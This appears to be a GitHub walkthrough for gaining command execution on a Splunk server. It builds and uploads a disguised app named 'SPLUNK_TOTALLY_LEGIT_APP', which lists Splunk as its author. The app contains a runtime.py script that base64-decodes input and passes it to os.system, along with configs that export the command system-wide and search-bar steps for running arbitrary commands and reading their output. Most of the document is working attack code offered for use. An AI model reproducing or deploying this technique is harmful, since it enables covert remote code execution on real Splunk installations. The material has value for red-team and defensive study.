# Splunk Application Reverse Shell

## Steps

### 1) Create a working directory

    cd ~; mkdir splunk

### 2) Create an app and give it a legitimate name to hide in plain sight

    mkdir 'SPLUNK_TOTALLY_LEGIT_APP'; cd SPLUNK_TOTALLY_LEGIT_APP
    mkdir bin default metadata

### 3) Create a program that executes commands (there are various techniques)

A command execution technique that doesn't depend on egress from the AWS environment being allowed.

#### runtime.py

    output_file_path = "/tmp/output.txt"
    
    try:
        command = base64.b64decode(sys.argv[1]).decode("utf-8")
    
        with open(output_file_path, "w") as output_file:
            exit_code = sys.modules['os'].system(f"{command} > {output_file_path} 2>&1")
    
        if exit_code != 0:
            results = splunk.Intersplunk.generateErrorResults(f"Error: Command exited with code {exit_code}")
    except Exception:
        import traceback
        stack = traceback.format_exc()
        results = splunk.Intersplunk.generateErrorResults("Error : Traceback: " + str(stack))
    
    splunk.Intersplunk.outputResults(results)

### 4) Create more files with the below contents

default/app.conf

    [launcher]
    author=Splunk
    description=Runtime app
    version=0.6
    [ui]
    is_visible = true

default/commands.conf

    [runtime]
    type = python
    filename = runtime.py
    local = false
    enableheader = false
    streaming = false
    perf_warn_limit = 0

metadata/default.meta

    [commands]
    export = system

### 5) Create an archive

    tar -czvf 'SPLUNK_TOTALLY_LEGIT_APP.tar.gz' 'SPLUNK_TOTALLY_LEGIT_APP'

### 6) In the Apps list, click Install app from file. Then browse to the malicious add-in and upload it.

<img width="1920" height="588" alt="image" src="https://github.com/user-attachments/assets/6cfeb38a-4222-4b88-88e9-c008787bd3ef" />

### 7) Clicking on it from the app menu brings us to a Splunk search field.

### 8) Run command

Base64 the command

    echo -n 'whoami' | base64

Run it in the search bar

    * | script runtime d2hvYW1p

### 9) Check command output (optional if planning to go for a reverse shell in the first place)

Click on Settings from the menu bar and then Data inputs. Then click Files & Directories.

<img width="1920" height="542" alt="image" src="https://github.com/user-attachments/assets/abf34231-bb3e-4765-846f-c53f4c2e1f07" />

Click New Local File & Directory.

<img width="1920" height="714" alt="image" src="https://github.com/user-attachments/assets/83bbd5cd-9d71-439f-9a33-2df0cb602815" />

Input /tmp/output in the field and click Next.

<img width="1920" height="664" alt="image" src="https://github.com/user-attachments/assets/6c970953-9bd0-42dd-bdf0-8519148bb02e" />

Command output

<img width="1920" height="674" alt="image" src="https://github.com/user-attachments/assets/23fb1a79-4011-46dc-b64f-7e2597eae7d3" />
